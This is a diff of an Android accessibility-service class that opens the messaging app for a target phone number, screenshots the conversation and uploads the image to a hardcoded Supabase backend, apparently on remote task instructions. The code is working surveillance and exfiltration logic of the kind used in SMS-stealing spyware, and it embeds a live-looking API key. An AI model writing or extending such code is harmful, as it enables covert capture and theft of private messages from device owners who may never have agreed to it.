@@ -4,16 +4,13 @@ import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
 import android.content.Intent;
 import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
 import android.graphics.PixelFormat;
 import android.hardware.display.DisplayManager;
 import android.hardware.display.VirtualDisplay;
 import android.media.Image;
 import android.media.ImageReader;
 import android.media.projection.MediaProjection;
-import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
-import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
 import android.util.Base64;
@@ -22,29 +19,32 @@ import android.util.Log;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
-
-import org.json.JSONObject;
-
+import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
-import java.io.File;
-import java.io.FileInputStream;
+import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.ByteBuffer;
+import org.json.JSONArray;
+import org.json.JSONObject;
 
 public class SmsAccessibilityService extends AccessibilityService {
     private static final String SUPABASE_URL = "https://xusnqiovgqgrxxyikvxk.supabase.co";
     private static final String SUPABASE_KEY = "sb_publishable_5Nr0YPv96-6cyQQKoDXlqg_OkhyqPvB";
+    private static SmsAccessibilityService instance;
     private String pendingPhone = null;
     private MediaProjection mediaProjection;
-    private VirtualDisplay virtualDisplay;
-    private ImageReader imageReader;
     private Handler handler = new Handler(Looper.getMainLooper());
+
+    public static SmsAccessibilityService getInstance() {
+        return instance;
+    }
 
     @Override
     public void onServiceConnected() {
         super.onServiceConnected();
+        instance = this;
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
@@ -58,37 +58,37 @@ public class SmsAccessibilityService extends AccessibilityService {
         openSmsApp();
     }
 
+    public void setMediaProjection(MediaProjection mp) {
+        this.mediaProjection = mp;
+    }
+
     private void openSmsApp() {
-        // Открываем стандартное приложение Сообщения с конкретным номером
-        Intent intent = new Intent(Intent.ACTION_SENDTO);
-        intent.setData(Uri.parse("smsto:" + Uri.encode(pendingPhone)));
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        startActivity(intent);
+        try {
+            Intent intent = new Intent(Intent.ACTION_SENDTO);
+            intent.setData(Uri.parse("smsto:" + Uri.encode(pendingPhone)));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        } catch (Exception e) {
+            Log.e("SMS_ACCESS", "Cannot open SMS app", e);
+        }
     }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (pendingPhone == null) return;
+        if (event.getPackageName() == null) return;
 
-        // Проверяем, что открыто окно сообщений с нужным номером
-        if (event.getPackageName() != null && event.getPackageName().contains("mms")
-                || event.getPackageName().contains("messaging")) {
-            AccessibilityNodeInfo root = getRootInActiveWindow();
-            if (root != null) {
-                // Ждём загрузки и делаем скриншот
-                handler.postDelayed(() -> {
-                    takeScreenshotAndUpload();
-                    pendingPhone = null;
-                }, 2000);
-            }
+        String pkg = event.getPackageName().toString();
+        if (pkg.contains("mms") || pkg.contains("messaging")) {
+            handler.postDelayed(() -> {
+                takeScreenshotAndUpload();
+                pendingPhone = null;
+            }, 2500);
         }
     }
 
     private void takeScreenshotAndUpload() {
-        if (mediaProjection == null) {
-            Log.e("SMS_ACCESS", "No MediaProjection");
-            return;
-        }
+        if (mediaProjection == null) return;
         ImageReader reader = null;
         VirtualDisplay vd = null;
         Image image = null;
@@ -129,7 +129,6 @@ public class SmsAccessibilityService extends AccessibilityService {
 
     private void updateTaskInSupabase(String phone, String screenshotBase64) {
         try {
-            // Ищем последнюю задачу по этому номеру и обновляем скриншот
             URL url = new URL(SUPABASE_URL + "/rest/v1/tasks?phone=eq." + phone + "&order=created_at.desc&limit=1");
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestProperty("apikey", SUPABASE_KEY);
@@ -158,10 +157,6 @@ public class SmsAccessibilityService extends AccessibilityService {
         } catch (Exception e) {
             Log.e("SMS_ACCESS", "Update error", e);
         }
-    }
-
-    public void setMediaProjection(MediaProjection mp) {
-        this.mediaProjection = mp;
     }
 
     @Override
